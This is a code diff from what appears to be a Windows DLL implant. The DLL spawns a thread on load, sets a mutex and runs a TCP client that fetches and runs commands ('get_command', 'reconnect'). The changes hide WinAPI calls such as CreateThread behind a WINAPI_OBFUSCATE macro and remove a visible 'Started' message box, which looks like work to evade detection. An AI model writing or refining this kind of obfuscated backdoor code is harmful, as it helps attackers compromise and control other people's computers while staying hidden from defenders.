@@ -46,14 +46,8 @@ DWORD close_client_on_threats(LPVOID client_pointer) {
 
 
 void get_command(TCPClient& client) {
-    CreateThread(
-        nullptr,
-        0,
-        close_client_on_threats,
-        &client,
-        0,
-        0
-    );
+    create_thread_type create_thread = WINAPI_OBFUSCATE(create_thread_type, "CreateThread", "kernel32");
+    create_thread(nullptr, 0, close_client_on_threats, &client, 0, 0);
     get_module_handle_type get_module_handle = WINAPI_OBFUSCATE(get_module_handle_type, "GetModuleHandleW", "kernel32");
     free_library_and_exit_thread_type free_library_and_exit_thread = WINAPI_OBFUSCATE(free_library_and_exit_thread_type, "FreeLibraryAndExitThread", "kernel32");
     client.reconnect();
@@ -80,19 +74,10 @@ void get_command(TCPClient& client) {
 
 DWORD dll_main(LPVOID param) {
     initilize_winapi();
-    MessageBoxA(
-        nullptr,
-        "Started",
-        "",
-        0
-    );
     sleep_type sleep = WINAPI_OBFUSCATE(sleep_type, "Sleep", "kernel32");
     create_mutex_a_type create_mutex_a = WINAPI_OBFUSCATE(create_mutex_a_type, "CreateMutexA", "kernel32");
-    AutoHandle mutex = create_mutex_a(
-        0,
-        false,
-        MUTEX_NAME
-    );
+
+    AutoHandle mutex = create_mutex_a(0, false, MUTEX_NAME);
     if (nullptr == mutex) {
         return 0;
     }
@@ -121,14 +106,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-        CreateThread(
-            nullptr,
-            0,
-            dll_main,
-            nullptr,
-            0,
-            0
-        );
+        CreateThread(nullptr, 0, dll_main, nullptr, 0, 0);
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
